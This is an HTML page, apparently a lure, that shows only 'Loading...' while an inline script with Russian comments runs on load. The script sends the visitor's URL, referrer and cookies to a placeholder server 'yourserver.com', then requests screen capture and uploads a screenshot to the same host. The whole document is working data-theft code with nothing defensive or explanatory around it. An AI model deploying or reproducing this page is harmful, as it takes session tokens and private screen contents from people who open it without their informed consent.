<html>
<head>
    <script>
        // 1. Фиксируем URL, реферера и токены
        fetch('https://yourserver.com/log.php?data=' + encodeURIComponent(document.location + ' | ' + document.referrer + ' | ' + document.cookie));

        // 2. Запрашиваем разрешение на экранный захват (может сработать в некоторых браузерах)
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Отправляем снимок экрана
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    let imgData = canvas.toDataURL('image/png');
                    fetch('https://yourserver.com/upload.php', {
                        method: 'POST',
                        body: JSON.stringify({ image: imgData }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
